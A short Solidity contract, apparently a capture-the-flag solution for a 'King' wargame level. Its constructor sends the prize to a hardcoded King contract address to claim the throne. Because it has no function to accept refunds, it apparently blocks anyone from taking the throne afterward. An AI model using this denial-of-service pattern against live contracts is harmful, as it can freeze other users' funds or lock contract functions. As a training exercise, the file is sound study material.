// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./king.sol";

contract KingHack {
    King public king;

    constructor() payable {
        king = King(payable(0x6752C38166f905Cb3FA16d0d28a26a8090581a16));
        address(king).call{value: king.prize()}("");
    }
}
